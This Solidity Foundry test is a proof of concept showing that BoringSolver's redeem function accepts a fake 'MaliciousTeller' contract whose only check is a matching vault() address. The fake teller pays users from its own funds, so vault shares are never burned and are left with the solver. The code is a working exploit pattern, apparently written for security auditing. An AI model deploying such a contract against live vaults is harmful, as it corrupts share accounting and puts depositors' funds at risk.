// SPDX-License-Identifier: SEL-1.0
pragma solidity 0.8.21;

import {BoringQueueTest} from "./BoringQueue.t.sol";
import {BoringOnChainQueue} from "src/base/Roles/BoringQueue/BoringOnChainQueue.sol";
import {ERC20} from "@solmate/tokens/ERC20.sol";
import {SafeTransferLib} from "@solmate/utils/SafeTransferLib.sol";

/// @notice A fake "teller" that passes BoringSolver's only identity check
///         (teller.vault() == boringVault) but never actually touches the real
///         vault's exit()/burn logic. It just pays out from its own pre-funded
///         balance instead of redeeming real shares through the real Teller.
contract MaliciousTeller {
    using SafeTransferLib for ERC20;

    address public immutable vaultAddr;
    ERC20 public immutable fundingAsset;

    constructor(address _vault, ERC20 _fundingAsset) {
        vaultAddr = _vault;
        fundingAsset = _fundingAsset;
    }

    // This is the ONLY thing BoringSolver checks about the teller it's given.
    function vault() external view returns (address) {
        return vaultAddr;
    }

    // No pause check, no asset allowlist, no real vault.exit() call at all --
    // shares are never burned. Just pay out from our own pre-funded stash.
    function bulkWithdraw(ERC20, /*withdrawAsset*/ uint256, /*shareAmount*/ uint256, /*minimumAssets*/ address to)
        external
        returns (uint256 assetsOut)
    {
        assetsOut = fundingAsset.balanceOf(address(this));
        fundingAsset.safeTransfer(to, assetsOut);
    }
}

contract MaliciousTellerPoC is BoringQueueTest {
    function testMaliciousTellerBypassesRealBurn() external {
        uint128 amountOfShares = 100e18;
        uint16 discount = 1;
        uint24 secondsToDeadline = 1 days;

        BoringOnChainQueue.OnChainWithdraw[] memory requests = new BoringOnChainQueue.OnChainWithdraw[](1);
        (, requests[0]) = _haveUserCreateRequest(testUser, address(WETH), amountOfShares, discount, secondsToDeadline);

        skip(3 days);

        // Deploy the fake teller, funded with real WETH from this test contract's
        // own balance -- representing an attacker's own money, not stolen funds.
        MaliciousTeller fakeTeller = new MaliciousTeller(liquidEth, WETH);
        WETH.transfer(address(fakeTeller), 1_000e18);

        uint256 totalSupplyBefore = ERC20(liquidEth).totalSupply();
        uint256 solverShareBalanceBefore = ERC20(liquidEth).balanceOf(address(boringSolver));

        // Solve using the FAKE teller instead of the real liquidEth_teller.
        boringSolver.boringRedeemSolve(requests, address(fakeTeller), false);

        uint256 totalSupplyAfter = ERC20(liquidEth).totalSupply();
        uint256 solverShareBalanceAfter = ERC20(liquidEth).balanceOf(address(boringSolver));

        // The withdrawing user still got paid in full.
        assertEq(WETH.balanceOf(testUser), requests[0].amountOfAssets, "User should have received their wETH.");

        // But total supply did NOT decrease -- the real shares were never burned.
        assertEq(totalSupplyAfter, totalSupplyBefore, "Total supply changed -- shares were burned as expected (bypass failed).");

        // And BoringSolver itself is left holding the real, un-burned vault shares.
        assertEq(
            solverShareBalanceAfter - solverShareBalanceBefore,
            amountOfShares,
            "Solver should be left holding the real, un-burned vault shares."
        );
    }
}
